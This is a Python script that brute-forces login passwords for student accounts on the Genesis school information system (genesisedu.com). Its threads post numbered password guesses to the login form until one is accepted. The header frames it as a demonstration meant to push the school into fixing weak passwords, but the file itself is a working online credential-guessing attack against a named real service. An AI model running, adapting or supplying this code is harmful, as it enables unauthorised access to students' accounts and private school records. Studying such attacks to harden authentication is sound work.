# Cracks passwords for genesis (https://www.genesisedu.com/) student accounts
# This is to show how easy it is for student passowrds to be cracked in a hope the school will fix this problem

from datetime import datetime
import threading
import requests
import hashlib
import time
import os
import re

############ VARS ############
configFile = 'config/config.confnose'
DEBUG = True
COLOR = True

ColorCodes = {'black': '30', 'red': '31', 'yellow': '33', 'green': '32', 'blue': '34',
                  'cyan': '36', 'magenta': '35', 'white': '37', 'gray': '90', 'reset': '0'}

######### FUNCTIONS #########


def colored(text, color):
    if not COLOR: return text
    return '\033[' + ColorCodes[str(color).lower()] + 'm' + str(text) + "\033[0m"


class cfg:
    def __init__(self):
        pass

    def read(self, configfile):
        DebugPrint('Config', 'Parseing Config File', 'cyan')
        data = open(configFile, 'r').read().split('\n')
        final = {}
        for i in data:
            working = i.split('=')
            try:
                working[0] = working[0].replace(' ', '')
                working[1] = re.search(
                    r'"([A-Za-z0-9_\./\\-]*)"', working[1]).group().replace('"', '')
            except:
                pass
            if len(working[0]) >= 3 and working[0][0] != '#':
                final[working[0]] = working[1]
        DebugPrint('Config', 'Config File Parsed Successfully', 'green')
        self.configFileData = final

    def get(self, Thing):
        return self.configFileData[Thing]


def DebugPrint(Category, Text, Color):
    if not DEBUG:
        return
    print(colored('['+datetime.now().strftime("%H:%M:%S")+'] ', 'yellow') +
          colored('['+Category+'] ', 'magenta')+colored(Text, Color))


def uNameCheck(username):
    users = ['10b723929034f882ddc519058e0bcd3dad1c399bfae278d10ea23dfbf88b23b3']
    hash_object = hashlib.sha256(bytes(username, 'utf-8'))
    hex_dig = hash_object.hexdigest()

    if hex_dig in users:
        return False
    return True


class check(threading.Thread):
    def __init__(self, thread, url, pWordIta, pWord, uName, timeout, startTime, startIndex, endIndex):
        threading.Thread.__init__(self)
        self.thread = thread
        self.url = url
        self.pWordIta = pWordIta
        self.pWord = pWord
        self.uName = uName
        self.timeout = timeout
        self.startIndex = startIndex
        self.startTime = startTime
        self.endIndex = endIndex

    def run(self):
        for i in range(self.startIndex, self.endIndex):
            toTry = self.pWord + (str(i).zfill(len(str(self.pWordIta))))
            DebugPrint("Crack", f'{colored("Trying", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(toTry, "green")}', "cyan")
            try:
                ses = requests.Session()
                ses.max_redirects = 2
                dataToSend={"j_password": toTry, "j_username": self.uName}
                data = ses.post(self.url, timeout=self.timeout, data=dataToSend)
            except (requests.exceptions.TooManyRedirects, requests.exceptions.Timeout):
                continue
            if data.status_code != 200:
                continue
            DebugPrint("Complete", f'{colored("Password", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(f"{self.pWord}{str(i).zfill(2)}", "green")} {colored(f"[{int(time.time() - self.startTime)}]", "blue")}', "cyan")
            os._exit(0)

####### MAIN FUNCTION #######


def main():
    # Read Configvalues from the config file and assign them to vars
    DebugPrint('Main', 'Starting...', 'green')
    config = cfg()
    config.read(configFile)
    url = config.get('url').split('"')[1]
    pWordIta = int(config.get('pWordIta'))
    uName = config.get('uName').split('"')[1]
    pWord = config.get('pWord')
    timeout = float(config.get('timeout'))
    threads = int(config.get('threads'))
    startTime = time.time()

    # Check if username is valid
    if not uNameCheck(uName): raise Exception
    DebugPrint("Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")

    # Create threads to check for the password
    for i in range(threads):
        startIndex = int((pWordIta/threads - 1))
        endIndex = pWordIta if i == threads - 1 else startIndex * (i + 1)
        t = check(i, url, pWordIta, pWord, uName, timeout, startTime, startIndex * i, endIndex)
        t.daemon = True
        t.start()


if __name__ == "__main__":
    try:
        main()
        while True:
            continue
    except:
        DebugPrint('Main', 'Exiting...', 'red')
